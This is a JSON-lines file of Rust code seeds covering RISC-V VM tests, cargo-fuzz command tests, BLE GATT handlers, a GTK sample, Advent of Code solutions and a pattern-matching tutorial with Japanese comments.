{"seed":"pub fn test_contains_ckbforks_section() {\n    let buffer = fs::read(\"tests\/programs\/ckbforks\").unwrap();\n    let ckbforks_exists_v0 = || -> bool {\n        let elf = goblin_v023::elf::Elf::parse(&buffer).unwrap();\n        for section_header in &elf.section_headers {\n            if let Some(Ok(r)) = elf.shdr_strtab.get(section_header.sh_name) {\n                if r == \".ckb.forks\" {\n                    return true;\n                }\n            }\n        }\n        return false;\n    }();\n    let ckbforks_exists_v1 = || -> bool {\n        let elf = goblin_v040::elf::Elf::parse(&buffer).unwrap();\n        for section_header in &elf.section_headers {\n            if let Some(Ok(r)) = elf.shdr_strtab.get(section_header.sh_name) {\n                if r == \".ckb.forks\" {\n                    return true;\n                }\n            }\n        }\n        return false;\n    }();\n    assert_eq!(ckbforks_exists_v0, true);\n    assert_eq!(ckbforks_exists_v1, true);\n}","id":183}
{"seed":"fn a_table_should_read_0_for_any_key() {\n  let mut table = HashMapOfTreeMap::new();\n  let mut vs = [Value::default(); 1];\n  table.read (0, &[0], &mut vs);\n  match vs {\n    [Value { v: 0, t: 0}] => (),\n    _ => assert!(false)\n  }\n}","id":184}
{"seed":"pub fn debug_format(input: String) -> String {\n    if input.len() <= 20 {\n        return input;\n    }\n    input\n        .chars()\n        .take(8)\n        .chain(\"...\".chars())\n        .chain(input.chars().skip(input.len() - 8))\n        .collect()\n}","id":185}
{"seed":"pub fn set_working_folder(working_folder: String) -> Result<(), ()> {\n    unsafe {\n        WORKING_FOLDER = working_folder;\n    }\n    Ok(())\n}","id":186}
{"seed":"pub async fn render_window_wasm(subaction: brawllib_rs::high_level_fighter::HighLevelSubaction) {\n    use brawllib_rs::renderer::app::state::{AppEventIncoming, State};\n    use brawllib_rs::renderer::app::App;\n    use wasm_bindgen::prelude::*;\n    use web_sys::HtmlElement;\n\n    let document = web_sys::window().unwrap().document().unwrap();\n\n    let body = document.body().unwrap();\n    let parent_div = document.create_element(\"div\").unwrap();\n    parent_div\n        .dyn_ref::<HtmlElement>()\n        .unwrap()\n        .style()\n        .set_css_text(\"margin: auto; width: 80%; aspect-ratio: 4 \/ 2; background-color: black\");\n    body.append_child(&parent_div).unwrap();\n\n    let app = App::new_insert_into_element(parent_div, subaction).await;\n    let event_tx = app.get_event_tx();\n\n    let frame = document.create_element(\"p\").unwrap();\n    frame.set_inner_html(\"Frame: 0\");\n    body.append_child(&frame).unwrap();\n\n    let button = document.create_element(\"button\").unwrap();\n    body.append_child(&button).unwrap();\n    let button_move = button.clone();\n    button_move.set_inner_html(\"Run\");\n    let event_tx_move = event_tx.clone();\n    let do_thing = Closure::wrap(Box::new(move || {\n        if button_move.inner_html() == \"Stop\" {\n            event_tx_move\n                .send(AppEventIncoming::SetState(State::Pause))\n                .unwrap();\n            button_move.set_inner_html(\"Run\");\n        } else {\n            event_tx_move\n                .send(AppEventIncoming::SetState(State::Play))\n                .unwrap();\n            button_move.set_inner_html(\"Stop\");\n        }\n    }) as Box<dyn FnMut()>);\n    button\n        .dyn_ref::<HtmlElement>()\n        .unwrap()\n        .set_onclick(Some(do_thing.as_ref().unchecked_ref()));\n\n    let button = document.create_element(\"button\").unwrap();\n    body.append_child(&button).unwrap();\n    let button_move = button.clone();\n    button_move.set_inner_html(\"Perspective\");\n    let do_thing = Closure::wrap(Box::new(move || {\n        if button_move.inner_html() == \"Orthographic\" {\n            event_tx\n                .send(AppEventIncoming::SetPerspective(false))\n                .unwrap();\n            button_move.set_inner_html(\"Perspective\");\n        } else {\n            event_tx\n                .send(AppEventIncoming::SetPerspective(true))\n                .unwrap();\n            button_move.set_inner_html(\"Orthographic\");\n        }\n    }) as Box<dyn FnMut()>);\n    button\n        .dyn_ref::<HtmlElement>()\n        .unwrap()\n        .set_onclick(Some(do_thing.as_ref().unchecked_ref()));\n\n    app.get_event_tx()\n        .send(AppEventIncoming::SetState(State::Pause))\n        .unwrap();\n\n    app.run();\n}","id":187}
{"seed":"extern \"C\" fn gatt_svr_chr_access_device_info(\n    _conn_handle: u16,\n    _attr_handle: u16,\n    ctxt: *mut ble_gatt_access_ctxt,\n    _arg: *mut ::core::ffi::c_void,\n) -> i32 {\n    let uuid: u16 = unsafe { ble_uuid_u16((*(*ctxt).__bindgen_anon_1.chr).uuid) };\n\n    if uuid == GATT_MODEL_NUMBER_UUID {\n        let rc: i32 = unsafe {\n            os_mbuf_append(\n                (*ctxt).om,\n                MODEL_NUM.as_ptr() as *const c_void,\n                MODEL_NUM.len() as u16,\n            )\n        };\n        return if rc == 0 {\n            0\n        } else {\n            BLE_ATT_ERR_INSUFFICIENT_RES as i32\n        };\n    }\n\n    if uuid == GATT_MANUFACTURER_NAME_UUID {\n        let rc: i32 = unsafe {\n            os_mbuf_append(\n                (*ctxt).om,\n                MANUF_NAME.as_ptr() as *const c_void,\n                MANUF_NAME.len() as u16,\n            )\n        };\n        return if rc == 0 {\n            0\n        } else {\n            BLE_ATT_ERR_INSUFFICIENT_RES as i32\n        };\n    }\n\n    return BLE_ATT_ERR_UNLIKELY as i32;\n}","id":188}
{"seed":"fn a_table_should_read_and_write_batches() {\n  let mut table = HashMapOfTreeMap::new();\n  table.write(0, &[Row { k: 0, v: 1 }, Row { k: 1, v: 2 }]);\n  let mut vs = [Value::default(); 2];\n  table.read (1, &[0, 1], &mut vs);\n  assert_eq!(vs, [Value { v: 1, t: 1 }, Value { v: 2, t: 1 }]);\n}","id":189}
{"seed":"fn handle_trame(trame: Trame) -> Option<Trame> {\n    match (\n        trame.id,\n        trame.cmd,\n        &trame.data[0..trame.data_length as usize],\n    ) {\n        (0...5, 0x0, [0x55]) => Some(trame!(trame.id, 0x00, [0xAA])),\n        (_, _, _) => None,\n    }\n}","id":190}
{"seed":"fn run_diagnostic_contains_fuzz_dir() {\n    let (fuzz_dir, mut project_builder) = project_with_fuzz_dir(\"run_with_crash\", None);\n    let project = project_builder\n        .with_fuzz()\n        .fuzz_target(\n            \"yes_crash\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    run_with_crash::fail_fuzzing(data);\n                });\n            \"#,\n        )\n        .build();\n\n    let run = format!(\n        \"cargo fuzz run --fuzz-dir {} yes_crash custom_dir\/artifacts\/yes_crash\",\n        &fuzz_dir\n    );\n\n    let tmin = format!(\n        \"cargo fuzz tmin --fuzz-dir {} yes_crash custom_dir\/artifacts\/yes_crash\",\n        &fuzz_dir\n    );\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"--fuzz-dir\")\n        .arg(fuzz_dir)\n        .arg(\"yes_crash\")\n        .arg(\"--\")\n        .arg(\"-runs=1000\")\n        .assert()\n        .stderr(predicates::str::contains(run).and(predicate::str::contains(tmin)))\n        .failure();\n}","id":191}
{"seed":"pub unsafe fn gatt_svr_init() -> i32 {\n    \/\/ Leaks the eff out of the svc_def\n    let svcs_ptr = alloc_svc_def();\n    print_svcs(svcs_ptr);\n\n    ble_svc_gap_init();\n    ble_svc_gatt_init();\n\n    let mut rc;\n\n    rc = ble_gatts_count_cfg(svcs_ptr);\n    esp_assert!(rc == 0, cstr!(\"RC err after ble_gatts_count_cfg\\n\"));\n\n    rc = ble_gatts_add_svcs(svcs_ptr);\n    esp_assert!(rc == 0, cstr!(\"RC err after ble_gatts_add_svcs\\n\"));\n\n    return 0;\n}","id":192}
{"seed":"fn cmin() {\n    let corpus = Path::new(\"fuzz\").join(\"corpus\").join(\"foo\");\n    let project = project(\"cmin\")\n        .with_fuzz()\n        .fuzz_target(\n            \"foo\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    let _ = data;\n                });\n            \"#,\n        )\n        .file(corpus.join(\"0\"), \"\")\n        .file(corpus.join(\"1\"), \"a\")\n        .file(corpus.join(\"2\"), \"ab\")\n        .file(corpus.join(\"3\"), \"abc\")\n        .file(corpus.join(\"4\"), \"abcd\")\n        .build();\n\n    let corpus_count = || {\n        fs::read_dir(project.root().join(\"fuzz\").join(\"corpus\").join(\"foo\"))\n            .unwrap()\n            .count()\n    };\n    assert_eq!(corpus_count(), 5);\n\n    project\n        .cargo_fuzz()\n        .arg(\"cmin\")\n        .arg(\"foo\")\n        .assert()\n        .success();\n    assert_eq!(corpus_count(), 1);\n}","id":193}
{"seed":"fn parse_prefix_command(rom: &[u8]) -> Option<Box<dyn Instruction>> {\n    let opcode = rom[0];\n    match opcode {\n        \/* RLC r *\/\n        0x00...0x07 => unimplemented!(\"RLC r\"),\n        \/* RRC r *\/\n        0x08...0x0F => unimplemented!(\"RRC r\"),\n        \/* RL B *\/\n        0x10 => cmd!(alu::RotateRegisterLeft(r8!(B))),\n        \/* RL C *\/\n        0x11 => cmd!(alu::RotateRegisterLeft(r8!(C))),\n        \/* RL D *\/\n        0x12 => cmd!(alu::RotateRegisterLeft(r8!(D))),\n        \/* RL E *\/\n        0x13 => cmd!(alu::RotateRegisterLeft(r8!(E))),\n        \/* RL H *\/\n        0x14 => cmd!(alu::RotateRegisterLeft(r8!(H))),\n        \/* RL L *\/\n        0x15 => cmd!(alu::RotateRegisterLeft(r8!(L))),\n        \/* RL A *\/\n        0x17 => cmd!(alu::RotateRegisterLeft(r8!(A))),\n        \/* RL (HL) *\/\n        0x16 => unimplemented!(\"RL (HL)\"),\n        \/* RR r *\/\n        0x17...0x1F => unimplemented!(\"RR r\"),\n        \/* SLA r *\/\n        0x20...0x27 => unimplemented!(\"SLA r\"),\n        \/* SRA r *\/\n        0x27...0x2F => unimplemented!(\"SRA r\"),\n        \/* BIT 0,r *\/\n        0x40...0x47 => unimplemented!(\"BIT 0,r\"),\n        \/* BIT 1,r *\/\n        0x47...0x4F => unimplemented!(\"BIT 1,r\"),\n        \/* BIT 7,r *\/\n        0x78...0x7F => {\n            let bit: u8 = 0b1000_0000;\n            let register = match opcode {\n                0x78 => Register8::B,\n                0x79 => Register8::C,\n                0x7A => Register8::D,\n                0x7B => Register8::E,\n                0x7C => Register8::H,\n                0x7D => Register8::L,\n                \/\/ 0x7E => TargetRegister::HL,\n                0x7F => Register8::A,\n                _ => unreachable!()\n            };\n            cmd!(alu::Bit {\n                bit,\n                register\n            })\n        },\n        _ => None\n\n    }\n\n}","id":194}
{"seed":"pub fn retype_cpool(source: CAddr, target: CAddr) {\n    system_call(SystemCall::RetypeCPool {\n        request: (source, target),\n    });\n}","id":195}
{"seed":"pub fn channel_put_cap(target: CAddr, value: CAddr) {\n    system_call(SystemCall::ChannelPut {\n        request: (target, ChannelMessage::Cap(Some(value)))\n    });\n}","id":196}
{"seed":"fn main() {\n    if env::args().len() != 2 {\n        panic!(\"Incorrect number of arguments provided\\n\");\n    }\n\n    let input = BufReader::new(File::open(env::args().nth(1).unwrap()).unwrap());\n\n    let mut cols: Vec<BTreeMap<char, i32>> = vec![];\n\n    for line in input.lines() {\n        for (i, c) in line.unwrap().chars().enumerate() {\n            if i == cols.len() {\n                cols.push(BTreeMap::new());\n            }\n            *cols[i].entry(c).or_insert(0) += 1;\n        }\n    }\n    let mut most = String::new();\n    let mut least = String::new();\n    for c in cols {\n        let (m, l) = most_least_common(c);\n        most.push(m);\n        least.push(l);\n    }\n    println!(\"Most common message: {}\", most);\n    println!(\"Least common message: {}\", least);\n}","id":197}
{"seed":"pub fn test_op_rvc_srai_crash_32() {\n    let buffer = fs::read(\"tests\/programs\/op_rvc_srai_crash_32\")\n        .unwrap()\n        .into();\n    let result = run::<u32, SparseMemory<u32>>(&buffer, &vec![\"op_rvc_srai_crash_32\".into()]);\n    assert!(result.is_ok());\n}","id":198}
{"seed":"pub fn test_load_elf_crash_64() {\n    let buffer = fs::read(\"tests\/programs\/load_elf_crash_64\").unwrap().into();\n    let result = run::<u64, SparseMemory<u64>>(&buffer, &vec![\"load_elf_crash_64\".into()]);\n    assert_eq!(result.err(), Some(Error::MemWriteOnExecutablePage));\n}","id":199}
{"seed":"pub fn day09_2(s: String) -> u32{\n    let mut running_total = 0;\n\n    let mut in_garbage = false;\n    let mut prev_cancel = false;\n    for c in s.chars(){\n        if in_garbage {\n            if c == '>' && !prev_cancel {\n                in_garbage = false;\n                prev_cancel = false;\n            }\n            else if c == '!' && !prev_cancel {\n                prev_cancel = true;\n            }\n            else if !prev_cancel{\n                running_total+=1;\n            }\n            else {\n                prev_cancel = false;\n            }\n        }\n        else{\n            if c == '<' {\n                in_garbage = true;\n                prev_cancel = false;\n            }\n        }\n    }\n    running_total\n}","id":200}
{"seed":"fn main() {\n    gtk::init();\n\n    let mut window = gtk::Window::new(gtk::WindowType::TopLevel).unwrap();\n\n    window.set_title(\"TreeView Sample\");\n    window.set_window_position(gtk::WindowPosition::Center);\n\n    Connect::connect(&window, DeleteEvent::new(&mut |_| {\n        gtk::main_quit();\n        true\n    }));\n\n    \/\/ test Value\n\n    let hello = String::from(\"Hello world !\");\n    let value = glib::Value::new().unwrap();\n\n    value.init(glib::Type::String);\n    value.set(&hello);\n    println!(\"gvalue.get example : {}\", value.get::<String>());\n\n    \/\/ left pane\n\n    let mut left_tree = gtk::TreeView::new().unwrap();\n    let column_types = [glib::Type::String];\n    let left_store = gtk::ListStore::new(&column_types).unwrap();\n    let left_model = left_store.get_model().unwrap();\n\n    left_tree.set_model(&left_model);\n    left_tree.set_headers_visible(false);\n    append_text_column(&mut left_tree);\n\n    for _ in 0..10 {\n        let mut iter = gtk::TreeIter::new().unwrap();\n        left_store.append(&mut iter);\n        left_store.set_string(&iter, 0, \"I'm in a list\");\n    }\n\n    \/\/ right pane\n\n    let mut right_tree = gtk::TreeView::new().unwrap();\n    let column_types = [glib::Type::String];\n    let right_store = gtk::TreeStore::new(&column_types).unwrap();\n    let right_model = right_store.get_model().unwrap();\n\n    right_tree.set_model(&right_model);\n    right_tree.set_headers_visible(false);\n    append_text_column(&mut right_tree);\n\n    for _ in 0..10 {\n        let mut iter = gtk::TreeIter::new().unwrap();\n\n        right_store.append(&mut iter, None);\n        right_store.set_value(&iter, 0, &value);\n\n        let mut child_iter = gtk::TreeIter::new().unwrap();\n\n        right_store.append(&mut child_iter, Some(&iter));\n        right_store.set_string(&child_iter, 0, \"I'm a child node\");\n    }\n\n    \/\/ display the panes\n\n    let mut split_pane = gtk::Box::new(gtk::Orientation::Horizontal, 10).unwrap();\n\n    split_pane.set_size_request(-1, -1);\n    split_pane.add(&left_tree);\n    split_pane.add(&right_tree);\n\n    window.add(&split_pane);\n    window.show_all();\n    gtk::main();\n}","id":201}
{"seed":"pub fn init(\n    src: String,\n    dst: String,\n    width: u32,\n) -> std::io::Result<()> {\n    let mut logger = env_logger::Builder::new();\n    logger.init();\n\n    let mut window = Window::new((width, 200)).unwrap();\n    let mut popup = Popup::new(width, window.hidpi);\n    let mut renderer = popup.get_renderer(&mut window.handle);\n    window.run(&mut popup, &mut renderer);\n\n    Ok(())\n}","id":202}
{"seed":"fn modules_file(repo: &Repository, at: &Commit) -> Result<String, Box<dyn std::error::Error>> {\n    if let Some(modules) = at.tree()?.get_name(\".gitmodules\") {\n        Ok(String::from_utf8(\n            modules.to_object(&repo)?.peel_to_blob()?.content().into(),\n        )?)\n    } else {\n        return Ok(String::new());\n    }\n}","id":203}
{"seed":"fn init_servo(robot: &mut Robot) {\n    let servos = ServoManager::new();\n\n    let m2 = servos[0xFE].reboot();\n\n    for b in m2 {\n        block!(robot.servo_tx.write(b)).unwrap();\n    }\n\n    for _ in 0..5 {\n        robot.delay.delay_ms(70 as u32);\n    }\n\n    let m2 = servos[0xFE].ram_write(WritableRamAddr::AckPolicy(2));\n\n    for b in m2 {\n        block!(robot.servo_tx.write(b)).unwrap();\n    }\n\n    let m1 = servos[0xFE].enable_torque();\n\n    for b in m1 {\n        block!(robot.servo_tx.write(b)).unwrap();\n    }\n}","id":204}
{"seed":"fn commit_coauthors(commit: &Commit) -> Vec<Author> {\n    let mut coauthors = vec![];\n    if let Some(msg) = commit.message_raw() {\n        lazy_static::lazy_static! {\n            static ref RE: Regex =\n                RegexBuilder::new(r\"^Co-authored-by: (?P<name>.*) <(?P<email>.*)>\")\n                    .case_insensitive(true)\n                    .build()\n                    .unwrap();\n        }\n\n        for line in msg.lines().rev() {\n            if line.starts_with(\"Co-authored-by\") {\n                if let Some(caps) = RE.captures(line) {\n                    coauthors.push(Author {\n                        name: caps[\"name\"].to_string(),\n                        email: caps[\"email\"].to_string(),\n                    });\n                }\n            }\n        }\n    }\n    coauthors\n}","id":205}
{"seed":"pub fn test_custom_syscall() {\n    let buffer = fs::read(\"tests\/programs\/syscall64\").unwrap().into();\n    let core_machine =\n        DefaultCoreMachine::<u64, SparseMemory<u64>>::new(ISA_IMC, VERSION0, u64::max_value());\n    let mut machine = DefaultMachineBuilder::new(core_machine)\n        .syscall(Box::new(CustomSyscall {}))\n        .build();\n    machine\n        .load_program(&buffer, &vec![\"syscall\".into()])\n        .unwrap();\n    let result = machine.run();\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), 39);\n}","id":206}
{"seed":"fn main() {\n  \/\/ \u30d1\u30bf\u30fc\u30f3\n    \/\/ \u30d1\u30bf\u30fc\u30f3\u306b\u306f\u4e00\u3064\u843d\u3068\u3057\u7a74\u304c\u3042\u308a\u307e\u3059\u3002\n    \/\/ \u65b0\u3057\u3044\u675f\u7e1b\u3092\u5c0e\u5165\u3059\u308b\u4ed6\u306e\u69cb\u6587\u3068\u540c\u69d8\u3001\u30d1\u30bf\u30fc\u30f3\u306f\u30b7\u30e3\u30c9\u30fc\u30a4\u30f3\u30b0\u3092\u3057\u307e\u3059\u3002\u4f8b\u3048\u3070\uff1a\n  let x = 'x';\n  let c = 'c';\n  match c {\n    x => println!(\"x: {} c: {}\", x, c), \/\/ \u5143\u306ex\u304c\u30b7\u30e3\u30c9\u30fc\u30a4\u30f3\u30b0\u3055\u308c\u3066\u3001\u5225\u306ex\u3068\u3057\u3066\u52d5\u4f5c\u3057\u3066\u3044\u308b\u3002\n  }\n  println!(\"x: {}\", x);\n    \/\/ x => \u306f\u5024\u3092\u30d1\u30bf\u30fc\u30f3\u306b\u30de\u30c3\u30c1\u3055\u305b\u3001\u30de\u30c3\u30c1\u306e\u8155\u5185\u3067\u6709\u52b9\u306a x \u3068\u3044\u3046\u540d\u524d\u306e\u675f\u7e1b\u3092\u5c0e\u5165\u3057\u307e\u3059\u3002\n    \/\/ \u65e2\u306b x \u3068\u3044\u3046\u675f\u7e1b\u304c\u5b58\u5728\u3057\u3066\u3044\u305f\u306e\u3067\u3001\u65b0\u305f\u306b\u5c0e\u5165\u3057\u305f x \u306f\u3001\u305d\u306e\u53e4\u3044 x \u3092\u30b7\u30e3\u30c9\u30fc\u30a4\u30f3\u30b0\u3057\u307e\u3059\u3002\n\n  \/\/ \u8907\u5f0f\u30d1\u30bf\u30fc\u30f3\n  let x2 = 1;\n  match x2 {\n    1 | 2 => println!(\"one or two\"),\n    3 => println!(\"three\"),\n    _ => println!(\"anything\"),\n  }\n\n  \/\/ \u5206\u914d\u675f\u7e1b\n  let origin = Point { x: 0, y: 0 };\n  match origin {\n    Point { x, y } => println!(\"({},{})\", x, y),\n  }\n\n    \/\/ \u5024\u306b\u5225\u306e\u540d\u524d\u3092\u4ed8\u3051\u305f\u3044\u3068\u304d\u306f\u3001 : \u3092\u4f7f\u3046\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n  let origin2 = Point { x: 0, y: 0 };\n  match origin2 {\n    Point { x: x1, y: y1 } => println!(\"({},{})\", x1, y1),\n  }\n\n    \/\/ \u5024\u306e\u4e00\u90e8\u306b\u3060\u3051\u8208\u5473\u304c\u3042\u308b\u5834\u5408\u306f\u3001\u5024\u306e\u3059\u3079\u3066\u306b\u540d\u524d\u3092\u4ed8\u3051\u308b\u5fc5\u8981\u306f\u3042\u308a\u307e\u305b\u3093\u3002\n  let origin = Point { x: 0, y: 0 };\n  match origin {\n    Point { x, .. } => println!(\"x is {}\", x),\n  }\n\n    \/\/ \u6700\u521d\u306e\u30e1\u30f3\u30d0\u3060\u3051\u3067\u306a\u304f\u3001\u3069\u306e\u30e1\u30f3\u30d0\u306b\u5bfe\u3057\u3066\u3082\u3053\u306e\u7a2e\u306e\u30de\u30c3\u30c1\u3092\u884c\u3046\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n  let origin = Point { x: 0, y: 0 };\n  match origin {\n    Point { y, .. } => println!(\"y is {}\", y),\n  }\n\n  \/\/ \u675f\u7e1b\u306e\u7121\u8996\n  let some_value: Result<i32, &'static str> = Err(\"There was an error\");\n  match some_value {\n    Ok(value) => println!(\"got a value: {}\", value),\n    Err(_) => println!(\"an error occurred\"),\n  }\n\n    \/\/ \u3053\u3053\u3067\u306f\u3001\u30bf\u30d7\u30eb\u306e\u6700\u521d\u3068\u6700\u5f8c\u306e\u8981\u7d20\u306b x \u3068 z \u3092\u675f\u7e1b\u3057\u307e\u3059\u3002\n  fn coordinate() -> (i32, i32, i32) {\n    \/\/ generate and return some sort of triple tuple\n    \/\/ 3\u8981\u7d20\u306e\u30bf\u30d7\u30eb\u3092\u751f\u6210\u3057\u3066\u8fd4\u3059\n    (1, 2, 3)\n  }\n  let (x, _, z) = coordinate();\n\n    \/\/ \u540c\u69d8\u306b .. \u3067\u30d1\u30bf\u30fc\u30f3\u5185\u306e\u8907\u6570\u306e\u5024\u3092\u7121\u8996\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n  enum OptionalTuple {\n    Value(i32, i32, i32),\n    Missing,\n  }\n  let x = OptionalTuple::Value(5, -2, 3);\n  match x {\n    OptionalTuple::Value(..) => println!(\"Got a tuple!\"),\n    OptionalTuple::Missing => println!(\"No such luck.\"),\n  }\n\n  \/\/ ref \u3068 ref mut\n    \/\/ \u53c2\u7167 \u3092\u53d6\u5f97\u3057\u305f\u3044\u3068\u304d\u306f ref \u30ad\u30fc\u30ef\u30fc\u30c9\u3092\u4f7f\u3044\u307e\u3057\u3087\u3046\u3002\n  let x3 = 5;\n  match x3 {\n    ref r => println!(\"Got a reference to {}\", r),\n  }\n    \/\/ \u30df\u30e5\u30fc\u30bf\u30d6\u30eb\u306a\u53c2\u7167\u304c\u5fc5\u8981\u306a\u5834\u5408\u306f\u3001\u540c\u69d8\u306b ref mut \u3092\u4f7f\u3044\u307e\u3059\u3002\n  let mut x = 5;\n  match x {\n    ref mut mr => {\n      *mr += 1;\n      println!(\"Got a mutable reference to {}\", mr);\n    },\n  }\n  println!(\"x = {}\", x);  \/\/ \u5024\u304c\u66f8\u304d\u63db\u308f\u3063\u3066\u3044\u308b\u3002\n\n  \/\/ \u7bc4\u56f2\n  let x = 1;\n  match x {\n    1 ... 5 => println!(\"one through five\"),\n    _ => println!(\"anything\"),\n  }\n    \/\/ \u7bc4\u56f2\u306f\u591a\u304f\u306e\u5834\u5408\u3001\u6574\u6570\u304b char \u578b\u3067\u4f7f\u308f\u308c\u307e\u3059\uff1a\n  let x = '\ud83d\udc85';\n  match x {\n    'a' ... 'j' => println!(\"early letter\"),\n    'k' ... 'z' => println!(\"late letter\"),\n    _ => println!(\"something else\"),\n  }\n\n  \/\/ \u675f\u7e1b\n  let x = 1;\n  match x {\n    e @ 1 ... 5 => println!(\"got a range element {}\", e),\n    _ => println!(\"anything\"),\n  }\n\n    \/\/ \u5185\u5074\u306e name \u306e\u5024\u3078\u306e\u53c2\u7167\u306b a \u3092\u675f\u7e1b\u3057\u307e\u3059\u3002\n  #[derive(Debug)]\n  struct Person {\n    name: Option<String>,\n  }\n  let name = \"Steve\".to_string();\n  let mut x: Option<Person> = Some(Person { name: Some(name) });\n  match x {\n    Some(Person { name: ref a @ Some(_), .. }) => println!(\"{:?}\", a),\n    _ => {}\n  }\n\n    \/\/ @ \u3092 | \u3068\u7d44\u307f\u5408\u308f\u305b\u3066\u4f7f\u3046\u5834\u5408\u306f\u3001\u305d\u308c\u305e\u308c\u306e\u30d1\u30bf\u30fc\u30f3\u3067\u540c\u3058\u540d\u524d\u304c\u675f\u7e1b\u3055\u308c\u308b\u3088\u3046\u306b\u3059\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\uff1a\n  let x = 5;\n  match x {\n    e @ 1 ... 5 | e @ 8 ... 10 => println!(\"got a range element {}\", e),\n    _ => println!(\"anything\"),\n  }\n\n  \/\/ \u30ac\u30fc\u30c9\n    \/\/ if \u3092\u4f7f\u3046\u3053\u3068\u3067\u30de\u30c3\u30c1\u30ac\u30fc\u30c9\u3092\u5c0e\u5165\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\uff1a\n  enum OptionalInt {\n    Value(i32),\n    Missing,\n  }\n  let x = OptionalInt::Value(5);\n  match x {\n    OptionalInt::Value(i) if i > 5 => println!(\"Got an int bigger than five!\"),\n    OptionalInt::Value(..) => println!(\"Got an int!\"),\n    OptionalInt::Missing => println!(\"No such luck.\"),\n  }\n\n    \/\/ \u8907\u5f0f\u30d1\u30bf\u30fc\u30f3\u3067 if \u3092\u4f7f\u3046\u3068\u3001 if \u306f | \u306e\u4e21\u5074\u306b\u9069\u7528\u3055\u308c\u307e\u3059\uff1a\n  let x = 4;\n  let y = false;\n  match x {\n    4 | 5 if y => println!(\"yes\"),\n    _ => println!(\"no\"),\n  }\n    \/\/ \u30a4\u30e1\u30fc\u30b8\uff1a (4 | 5) if y => ...\n\n  \/\/ \u6df7\u305c\u3066\u30de\u30c3\u30c1\n    \/\/ \u3084\u308a\u305f\u3044\u3053\u3068\u306b\u5fdc\u3058\u3066\u3001\u305d\u308c\u3089\u3092\u6df7\u305c\u3066\u30de\u30c3\u30c1\u3055\u305b\u308b\u3053\u3068\u3082\u3067\u304d\u307e\u3059\uff1a\n  \/\/ match x {\n  \/\/   Foo { x: Some(ref name), y: None } => { println!(\"foo\"); },\n  \/\/ }\n    \/\/ \u30d1\u30bf\u30fc\u30f3\u306f\u3068\u3066\u3082\u5f37\u529b\u3067\u3059\u3002\u4e0a\u624b\u306b\u4f7f\u3044\u307e\u3057\u3087\u3046\u3002\n}","id":207}
{"seed":"pub fn star2(lines: &Vec<String>) -> String {\n    let days = initialize(lines);\n\n    let mut guard_map = HashMap::new();\n    for day in days {\n        guard_map.entry(day.guard_id)\n            .or_insert(vec![])\n            .push(day);\n    }\n\n    let mut max_guard_asleep_per_minute = vec![(0, None); 60];\n    for &guard_id in guard_map.keys() {\n        let mut guard_asleep_by_minute = vec![0; 60];\n        for day in &guard_map[&guard_id] {\n            for minute in 0..60 {\n                guard_asleep_by_minute[minute] += i32::from(!day.minutes[minute]);\n            }\n        }\n        for minute in 0..60 {\n            if max_guard_asleep_per_minute[minute].0 < guard_asleep_by_minute[minute] {\n                max_guard_asleep_per_minute[minute] = (guard_asleep_by_minute[minute], Some(guard_id));\n            }\n        }\n    }\n    if let Some((max_minute, (_, Some(max_guard_id)))) = max_guard_asleep_per_minute.iter().enumerate().max_by_key(|(_, (times, _))| times) {\n        return (max_minute as i32 * max_guard_id) .to_string();\n    }\n    panic!(\"No maximum found: Invalid input!\");\n}","id":208}
{"seed":"pub fn checksum(input: &[u8]) -> Result<u16, LayerError> {\n    let mut sum = 0x00;\n    let mut chunks_iter = input.chunks_exact(2);\n    while let Some(chunk) = chunks_iter.next() {\n        sum += u32::from(u16::from_be_bytes(\n            chunk.try_into().expect(\"chunks of 2 bytes\"),\n        ));\n    }\n\n    if let [rem] = chunks_iter.remainder() {\n        sum += u32::from(u16::from_be_bytes([*rem, 0x00]));\n    }\n\n    let carry_add = (sum & 0xffff) + (sum >> 16);\n    let chksum = !(((carry_add & 0xffff) + (carry_add >> 16)) as u16);\n\n    Ok(chksum)\n}","id":209}
{"seed":"fn tmin() {\n    let corpus = Path::new(\"fuzz\").join(\"corpus\").join(\"i_hate_zed\");\n    let test_case = corpus.join(\"test-case\");\n    let project = project(\"tmin\")\n        .with_fuzz()\n        .fuzz_target(\n            \"i_hate_zed\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    let s = String::from_utf8_lossy(data);\n                    if s.contains('z') {\n                        panic!(\"nooooooooo\");\n                    }\n                });\n            \"#,\n        )\n        .file(&test_case, \"pack my box with five dozen liquor jugs\")\n        .build();\n    let test_case = project.root().join(test_case);\n    project\n        .cargo_fuzz()\n        .arg(\"tmin\")\n        .arg(\"i_hate_zed\")\n        .arg(\"--sanitizer=none\")\n        .arg(&test_case)\n        .assert()\n        .stderr(\n            predicates::str::contains(\"CRASH_MIN: minimizing crash input: \")\n                .and(predicate::str::contains(\"(1 bytes) caused a crash\"))\n                .and(predicate::str::contains(\n                    \"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\\n\\\n                     \\n\\\n                     Minimized artifact:\\n\\\n                     \\n\\\n                     \\tfuzz\/artifacts\/i_hate_zed\/minimized-from-\"))\n                .and(predicate::str::contains(\n                    \"Reproduce with:\\n\\\n                     \\n\\\n                     \\tcargo fuzz run --sanitizer=none i_hate_zed fuzz\/artifacts\/i_hate_zed\/minimized-from-\"\n                )),\n        )\n        .success();\n}","id":210}
